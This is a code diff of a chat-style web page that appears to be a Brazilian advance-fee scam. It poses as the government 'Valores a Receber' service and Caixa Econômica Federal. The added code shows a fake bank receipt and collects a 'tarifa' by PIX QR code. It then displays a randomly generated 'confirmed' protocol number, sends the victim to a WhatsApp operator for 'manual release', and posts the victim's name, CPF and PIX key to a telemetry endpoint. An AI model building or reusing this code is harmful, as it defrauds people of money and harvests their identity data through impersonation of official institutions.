@@ -32,6 +32,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
   const audioRef = useRef<HTMLAudioElement | null>(null);
   
   const [attendant, setAttendant] = useState({ name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" });
+  const [waNumber, setWaNumber] = useState("5511971730325");
 
   const endOfMessagesRef = useRef<HTMLDivElement>(null);
 
@@ -86,6 +87,9 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
           setTarifa(15.00);
         } else if (res.data.tarifaTransicional) {
           setTarifa(res.data.tarifaTransicional);
+        }
+        if (res.data.whatsappNumber) {
+          setWaNumber(res.data.whatsappNumber);
         }
       } catch (e) {
         console.error("Config fetch failed", e);
@@ -183,6 +187,40 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
     setMessages(prev => [...prev, { sender: "user", text }]);
   };
 
+  const handlePaymentCompleted = () => {
+    setMessages(prev => {
+      const newMessages = [...prev];
+      if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
+      return newMessages;
+    });
+    
+    setTyping(true);
+    setTimeout(() => {
+      setTyping(false);
+      const protocol = `SVR-` + Math.floor(Math.random() * 900000) + 100000;
+      addBotMessage(`✅ **PAGAMENTO CONFIRMADO!**\n\nSeu protocolo é: **${protocol}**\n\nSua solicitação já está em nosso sistema. Para finalizar a liberação do valor manualmente, clique no botão abaixo e fale com o atendimento no WhatsApp.`, [
+        { text: "Liberar Transferência (WhatsApp)", action: "go_whatsapp" }
+      ]);
+    }, 1500);
+  };
+
+  useEffect(() => {
+    let interval: NodeJS.Timeout;
+    if (buyPixData?.id) {
+      interval = setInterval(async () => {
+        try {
+          const res = await axios.get(`${API_URL}/api/v1/buypix/status/${buyPixData.id}`);
+          if (res.data.status === 'completed') {
+            clearInterval(interval);
+            handlePaymentCompleted();
+          }
+        } catch (e) {
+          console.error("Polling error", e);
+        }
+      }, 5000);
+    }
+    return () => clearInterval(interval);
+  }, [buyPixData]);
   const identifyPixType = (key: string) => {
     if (!key) return "Inválida";
     
@@ -392,6 +430,16 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       setTyping(false);
       addBotMessage("", undefined, undefined, "receipt");
     }
+    else if (action === "go_whatsapp") {
+      fetch(`${API_URL}/api/v1/telemetry/chat`, {
+         method: 'POST',
+         headers: { 'Content-Type': 'application/json' },
+         body: JSON.stringify({ action: 'whatsapp', leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue })
+      }).catch(console.error);
+
+      const message = encodeURIComponent(`Olá, sou o(a) ${leadName}. Eu realizei o pagamento e quero liberar o meu valor manualmente.`);
+      window.open(`https://wa.me/${waNumber}?text=${message}`, '_blank');
+    }
   };
 
   const copyPix = () => {
@@ -429,54 +477,58 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                   {msg.customType === "receipt" ? (
                     <div className="w-full">
                       {/* Receipt Card */}
-                      <div className="bg-white rounded-lg mb-5 shadow-lg text-gray-800 overflow-hidden border border-gray-200">
-                        {/* Gov.br Header */}
-                        <div className="bg-[#005CA9] p-4 flex flex-col items-center justify-center border-b-4 border-[#FFCD00]">
-                          <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="h-8 mb-2" />
-                          <h4 className="text-white font-bold text-[15px] text-center">SOLICITAÇÃO DE SAQUE APROVADA</h4>
-                          <p className="text-[#e0f2fe] text-xs mt-1 text-center">Sistema de Valores a Receber (SVR)</p>
+                      <div className="bg-[#f2f4f8] rounded-xl mb-5 shadow-lg text-gray-800 overflow-hidden border border-gray-200">
+                        {/* Caixa Header */}
+                        <div className="bg-[#005CA9] p-4 flex flex-col items-start justify-center">
+                          <h4 className="text-white font-black text-xl italic tracking-wide">CAIXA<span className="text-[#FFA500] ml-1">|</span></h4>
+                        </div>
+                        
+                        <div className="bg-white p-4 mx-4 mt-[-10px] rounded shadow-sm border border-gray-100 flex justify-between relative z-10 text-center">
+                          <div className="flex-1 border-r border-gray-200">
+                            <p className="text-gray-500 text-xs">Valor</p>
+                            <p className="text-[#005CA9] font-bold text-lg">R$ {tarifa.toFixed(2).replace('.', ',')}</p>
+                          </div>
+                          <div className="flex-1">
+                            <p className="text-gray-500 text-xs">Data</p>
+                            <p className="text-[#005CA9] font-bold text-[15px] leading-tight">{new Date().toLocaleDateString('pt-BR')}<br/><span className="text-xs font-normal text-gray-400">{new Date().toLocaleTimeString('pt-BR')}</span></p>
+                          </div>
                         </div>
 
                         {/* Recebedor info */}
-                        <div className="p-5 space-y-4">
-                          <div className="border-b border-gray-100 pb-2">
-                            <h3 className="text-[#005CA9] font-bold text-sm uppercase">Dados do Beneficiário</h3>
+                        <div className="px-5 pt-4 pb-2">
+                          <div className="border-b-2 border-[#005CA9] pb-1 mb-3">
+                            <h3 className="text-[#005CA9] font-bold text-[15px]">Dados do recebedor</h3>
                           </div>
                           
-                          <div className="grid grid-cols-2 gap-4">
-                            <div className="col-span-2">
-                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Nome / Razão Social</p>
-                              <p className="text-sm font-bold text-gray-800 uppercase">{leadName}</p>
-                            </div>
-                            
+                          <div className="space-y-3">
                             <div>
-                              <p className="text-[11px] text-gray-500 uppercase font-semibold">{data.docType}</p>
-                              <p className="text-sm font-bold text-gray-800">{data.docValue}</p>
+                              <p className="text-gray-500 text-[13px] mb-0.5">Nome</p>
+                              <p className="text-gray-800 font-bold text-[15px] uppercase">LIBERAÇÃO DE VALORES</p>
                             </div>
-
                             <div>
-                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Data Nasc/Abertura</p>
-                              <p className="text-sm font-bold text-gray-800">{data.birthDate}</p>
-                            </div>
-
-                            <div className="col-span-2">
-                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Chave PIX de Destino</p>
-                              <p className="text-sm font-bold text-gray-800">{leadPixKey}</p>
-                            </div>
-
-                            <div>
-                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Data da Solicitação</p>
-                              <p className="text-sm font-bold text-gray-800">{new Date().toLocaleDateString('pt-BR')}</p>
-                            </div>
-
-                            <div>
-                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Valor Aprovado</p>
-                              <p className="text-sm font-black text-[#00A300]">{leadValue}</p>
+                              <p className="text-gray-500 text-[13px] mb-0.5">Instituição</p>
+                              <p className="text-gray-800 font-bold text-[15px] uppercase">CAIXA ECONÔMICA FEDERAL</p>
                             </div>
                           </div>
+                        </div>
+
+                        <div className="h-2 bg-gray-100 w-full my-2"></div>
+
+                        {/* Pagador info */}
+                        <div className="px-5 pb-5 pt-2">
+                          <div className="border-b-2 border-[#005CA9] pb-1 mb-3">
+                            <h3 className="text-[#005CA9] font-bold text-[15px]">Dados do pagador</h3>
+                          </div>
                           
-                          <div className="bg-blue-50 p-3 rounded-lg border border-blue-100 mt-2">
-                             <p className="text-[11px] text-[#005CA9] text-center font-medium">A transferência será liberada após o pagamento da tarifa transacional obrigatória.</p>
+                          <div className="space-y-3">
+                            <div>
+                              <p className="text-gray-500 text-[13px] mb-0.5">Nome</p>
+                              <p className="text-gray-800 font-bold text-[15px] uppercase">{leadName}</p>
+                            </div>
+                            <div>
+                              <p className="text-gray-500 text-[13px] mb-0.5">{data.docType}</p>
+                              <p className="text-gray-800 font-bold text-[15px]">{data.docValue}</p>
+                            </div>
                           </div>
                         </div>
                       </div>
@@ -484,30 +536,19 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                       {/* Text below receipt */}
                       <div className="text-white space-y-4 text-sm leading-relaxed">
                         <p className="font-bold text-[15px]">GUIA DE PAGAMENTO GERADA COM SUCESSO!</p>
-                        <p>O cálculo do valor total da tarifa é feito sobre o valor que você tem disponível para receber ({leadValue}).</p>
-                        
-                        <div>
-                          <p>Tarifa Transacional: R$ {(tarifa * 0.33).toFixed(2).replace('.', ',')}</p>
-                          <p>Contribuição Federal: R$ {(tarifa * 0.33).toFixed(2).replace('.', ',')}</p>
-                          <p>Tarifa de Saque: R$ {(tarifa * 0.34).toFixed(2).replace('.', ',')}</p>
-                          <p className="font-bold mt-1">Total da Tarifa: R$ {tarifa.toFixed(2).replace('.', ',')}</p>
-                        </div>
-
-                        <p className="font-bold uppercase">
-                          APÓS O PAGAMENTO DA TARIFA, EM ATÉ 2 HORAS VOCÊ RECEBERÁ O VALOR TOTAL DE {leadValue} NA CONTA DA CHAVE PIX CADASTRADA:
-                        </p>
-
-                        <div>
-                          <p><span className="font-bold">Nome:</span> {leadName}</p>
-                          <p><span className="font-bold">Chave Pix:</span> {leadPixKey}</p>
-                        </div>
+                        <p>A taxa de emissão da transferência é gerada para processar a liberação e validar a chave PIX informada.</p>
                       </div>
 
                       <div className="mt-6 pt-5 border-t border-[#2e3b4e] flex flex-col items-center space-y-4">
                         {buyPixData?.pix_qr_code ? (
-                          <button onClick={copyPix} className="w-full max-w-[280px] bg-[#ff9029] hover:bg-[#e87f1f] text-white py-3 rounded-md font-bold transition-colors shadow-md text-sm mt-4">
-                              Copiar Código PIX
-                          </button>
+                          <>
+                            <div className="bg-white p-3 rounded-lg flex items-center justify-center">
+                              <QRCodeCanvas value={buyPixData.pix_qr_code} size={200} />
+                            </div>
+                            <button onClick={copyPix} className="w-full max-w-[280px] bg-[#ff9029] hover:bg-[#e87f1f] text-white py-3 rounded-md font-bold transition-colors shadow-md text-sm mt-4">
+                                Copiar Código PIX
+                            </button>
+                          </>
                         ) : (
                           <div className="flex justify-center p-4">
                             <Loader2 className="w-6 h-6 text-white animate-spin" />
